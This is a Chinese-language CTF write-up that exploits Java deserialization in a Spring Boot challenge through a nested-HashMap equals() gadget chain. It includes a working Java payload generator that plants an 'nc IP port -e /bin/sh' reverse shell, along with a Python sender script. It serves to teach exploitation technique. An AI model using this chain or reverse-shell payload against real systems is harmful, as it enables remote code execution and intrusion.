# week4Ez_girlfriend

## 题目简述

题目是一个 Spring Boot 服务，`/girlfriend` 接收 Base64 编码的 Java 序列化数据并直接调用 `ObjectInputStream.readObject()`。应用自带的 `Tools` 类实现了危险的 `equals()`：当比较对象是字符串时，会把私有字段 `girlfriend` 的内容交给 `Runtime.exec()`。目标是构造仅依赖 JDK 集合类和 `Tools` 的反序列化调用链，触发命令执行。

## 解题过程

反编译入口与危险类后，核心逻辑等价于：

~~~java
@RequestMapping("/girlfriend")
public String starter(@RequestParam(name = "object", required = false) String object)
        throws Exception {
    if (object != null) {
        Tools.deserialize(Tools.base64Decode(object));
    }
    return "ok";
}

public boolean equals(Object obj) {
    return girlfriendofwinmt(obj);
}

public boolean girlfriendofwinmt(Object obj) {
    if (obj instanceof String) {
        Runtime.getRuntime().exec(this.girlfriend);
        return true;
    }
    return false;
}
~~~

因此需要在反序列化期间制造一次 `tools.equals(某个字符串)`。可以利用 `HashMap` 恢复元素时的键冲突比较：

~~~text
ObjectInputStream.readObject()
└─ HashMap.readObject()
   └─ HashMap.putVal()
      └─ AbstractMap.equals()
         └─ Tools.equals(String)
            └─ Runtime.exec(girlfriend)
~~~

构造两个内部 `HashMap`，使用 Java 中哈希值相同的字符串 `"Aa"` 与 `"BB"` 作为键，并把一个普通字符串和 `Tools` 对象交叉放置：

~~~text
map1 = {"Aa": "stringsss", "BB": tools}
map2 = {"Aa": tools,       "BB": "stringsss"}
~~~

由于两个字符串的哈希相同，两个内部 Map 的整体哈希也相同。把它们作为外层 `HashMap` 的两个键后，外层 Map 在反序列化时插入第二个键，会调用 `AbstractMap.equals()` 比较两个内部 Map。比较同名键对应的值时，一侧是 `Tools`、另一侧是字符串，于是进入 `Tools.equals(String)`。

下面的生成器必须与题目中的 `Tools.class` 一起编译运行，以保证类名和 `serialVersionUID` 一致：

~~~java
package com.ctf.game.Controller;

import java.lang.reflect.Field;
import java.util.HashMap;

public class Payload {
    private static void setField(Object object, String name, Object value)
            throws Exception {
        Field field = object.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(object, value);
    }

    public static void main(String[] args) throws Exception {
        if (args.length != 2) {
            throw new IllegalArgumentException("用法: java ...Payload <监听IP> <监听端口>");
        }
        Tools tools = new Tools();

        HashMap<Object, Object> map1 = new HashMap<>();
        map1.put("Aa", "stringsss");
        map1.put("BB", tools);

        HashMap<Object, Object> map2 = new HashMap<>();
        map2.put("Aa", tools);
        map2.put("BB", "stringsss");

        HashMap<Object, Object> outer = new HashMap<>();
        outer.put(map1, "first");
        outer.put(map2, "second");

        String command = "nc " + args[0] + " " + args[1] + " -e /bin/sh";
        setField(tools, "girlfriend", command);

        byte[] serialized = Tools.serialize(outer);
        System.out.println(Tools.base64Encode(serialized));
    }
}
~~~

将程序输出作为 `object` 参数发送即可触发反序列化：

~~~python
import requests
import sys

base_url = sys.argv[1].rstrip("/")
payload = sys.stdin.read().strip()

response = requests.get(
    f"{base_url}/girlfriend",
    params={"object": payload},
    timeout=10,
)
print(response.text)
~~~

## 方法总结

这条链不依赖第三方 gadget 库：应用自身提供命令执行 sink，JDK 的嵌套 `HashMap` 负责在反序列化期间触发 `equals()`。分析此类题时，应先确认入口是否无类型限制地反序列化，再搜索可控字段进入的 `equals()`、`hashCode()`、`compareTo()` 等隐式方法，最后利用集合重建过程把危险方法串起来。
